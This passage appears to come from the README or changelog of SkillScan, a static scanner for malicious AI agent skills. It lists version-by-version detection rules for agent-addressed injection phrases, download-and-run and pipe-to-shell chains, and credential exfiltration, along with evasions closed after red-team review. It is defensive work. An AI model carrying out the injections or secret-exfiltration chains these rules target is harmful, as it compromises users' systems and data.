non-English instruction phrases in 14 languages, shell-substitution
execution, sends through session/client objects, compiled-code
coverage honesty (bytecode or native binaries with no inspectable
source can no longer read as clean), environment-injection shapes
(LD_PRELOAD and friends, predictable temp files), and OWASP mapping
metadata on every rule. v0.4 is the benchmark fix wave (measured
against MaliciousSkillBench): dependency-source checks over package
manifests (off-registry git/URL/path/index sources caution; the same
paired with install-time execution blocks), Node http/https network
coverage and a JS download-and-run rule, an install-prose
refinement — documentation naming a registry package no longer
cautions, while URL/archive/custom-index installs flag in prose and
code alike — plus the v0.3 re-run's ranked fixes: executing
substitutions inside documentation are capped at CAUTION (they are
code-fence examples; the same shape in a script still blocks),
directive-shaped HTML comments (agent-addressed orders in framing
vocabulary) caution again, a prose download-and-run chain rule for
download+execute instructions split across steps, and a
read-and-disclose combination for skills whose code reads files
while their prose sends the contents out. v0.5 is the standalone-
coverage wave (still zero-dependency, offline, deterministic):
prose fetch-and-execute / pipe-to-shell / read-and-send chains,
a safety-bypass rule whose combination with a download-and-run
chain blocks, output-manipulation and English prompt-manipulation
phrase families restricted to instruction surfaces (SKILL.md,
*.mdc, tool-description JSON), a small intra-file value-flow
analysis for Python (credential material reaching a network send
blocks; environment secrets landing in request bodies caution),
and an offline typosquat check for declared dependencies against
curated top-package lists. The v0.5 fix pass (three independent
adversarial reviews — red team, false-positive hunt, code audit —
run against the v0.5 build) then hardened the new surface: the
taint tracker became scope-aware and flow-sensitive, so a BLOCK
can no longer rest on a cross-function name collision or a
reassigned variable; taint now survives container writes and
ordinary method chains (`.strip()`, `.hex()`); the
lure combination now requires its two halves to sit in the same
file, near each other, outside warning/training framing (five
benign guides the build blocked now pass); output-manipulation
guards judge frame structure instead of keywords, closing
"this is just an example" laundering; disclose/read-send
suppression is judged per sentence, so a user's-own-data frame
no longer covers sending the same data to a named external
address; and the typosquat extractor now reads bare unpinned
names, setup.py, and Cyrillic-lookalike names. Expect false
positives and false negatives; the rule set and corpus are the starting
point, not the finished product. Issues and new evasion samples are
welcome — a mutation that evades SkillScan is a valuable contribution.
